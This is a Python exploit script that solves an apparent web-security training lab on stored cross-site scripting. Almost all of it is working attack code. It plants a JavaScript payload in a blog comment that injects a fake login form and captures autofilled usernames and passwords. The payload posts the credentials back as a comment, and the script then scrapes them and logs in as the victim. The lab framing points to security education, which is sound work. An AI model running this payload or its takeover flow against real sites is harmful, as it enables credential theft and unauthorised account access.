import requests
import urllib3
import sys
import re
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080', 'https' : 'http://127.0.0.1:8080'}

def get_csrf(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, "html.parser")
    csrf_token = soup.find("input", {'name' : 'csrf'})['value']
    return csrf_token

def xss_attack(s, url):
    # PREPARE URLs
    postComment_url = url + '/post/comment'
    post2_url = url + '/post?postId=2'
    post10_url = url + '/post?postId=10'
    login_url = url + '/login'
    
    # PREPARE THE PAYLOAD
    payload = """<section>
    <form class=login-form method=POST action=/login>
        <label>Username</label>
            <input required type=username name="username" id="user2hack">
        <label>Password</label>
            <input required type=password name="password" id="psw2hack">
            <button class=button type=submit> Log in </button>
    </form>
</section>
<script>
function grabUserPsw(){
    var username = document.getElementById("user2hack").value;
    var password = document.getElementById("psw2hack").value;
    return [username, password]
};

function postCreds(){
    var creds = grabUserPsw();
    var username = creds[0];
    var password = creds[1];
    var credentials = "username:" + username + " - password:" + password;
    var domain = document.domain;
    var csrf = document.getElementsByName("csrf")[0].defaultValue;
    var details = {
        "csrf" : csrf,
        "postId" : 2,
        "comment" : credentials,
        "name" : "victim",
        "email" : "test@test.test",
        "website" : "http://victim"
    };
    formBody = [];
    for (property in details){
        var encodedKey = encodeURIComponent(property);
        var encodedValue = encodeURIComponent(details[property]);
        formBody.push(encodedKey + "=" + encodedValue)
    };
    formBody = formBody.join("&");

    fetch("https://"+domain+"/post/comment", {
        method : "POST",
        headers : {
            "Content-Type": "application/x-www-form-urlencoded"
        },
        body : formBody
    });
};
document.body.onload = function(e){
    document.getElementById("psw2hack").addEventListener("change", function(e){
        postCreds();
    });
    document.getElementById("user2hack").click()
}
</script>"""

    params = {
        'csrf' : get_csrf(s, post10_url),
        'postId' : 10,
        'comment' : payload,
        'name' : 'attacker',
        'email' : 'att@cker',
        'website' : 'http://hack'
    }

    # STORE XSS
    r = s.post(postComment_url, data=params, verify=False, proxies=proxies)
    if "Your comment has been submitted." not in r.text:
        print("[-] Could not upload the payload")
        sys.exit(-1)
    print("[+] Payload uploaded!")

    # FETCH STOLEN CREDENTIALS
    r = s.get(post2_url, verify=False, proxies=proxies)
    creds = re.search(r".+username:(\w+).+password:([a-z,0-9]+)", r.text)
    if not creds:
        print("[-] No creds found!")
        sys.exit(-1)
    
    username = creds.group(1)
    password = creds.group(2)
    print("[+] Username {0} and password {1}".format(username, password))

    # LOGIN
    params = {
        'csrf' : get_csrf(s, login_url),
        'username' : username,
        'password' : password
    }
    r = s.post(login_url, data=params, verify=False, proxies=proxies)
    if "Your username is:" not in r.text:
        print("[-] Could not log in!")
        sys.exit(-1)
    print("[+] Logged-in!!!")
    

def main():
    if len(sys.argv) != 2:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1].strip()
    s = requests.Session()

    print("[+] Lab: Exploiting cross-site scripting to capture passwords")
    print("""[+] This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's username and password then use these credentials to log in to the victim's account.
    \nNOTE\nTo prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.
    Some users will notice that there is an alternative solution to this lab that does not require Burp Collaborator. However, it is far less subtle than exfiltrating the credentials.""")

    xss_attack(s, url)

if __name__ == "__main__":
    main()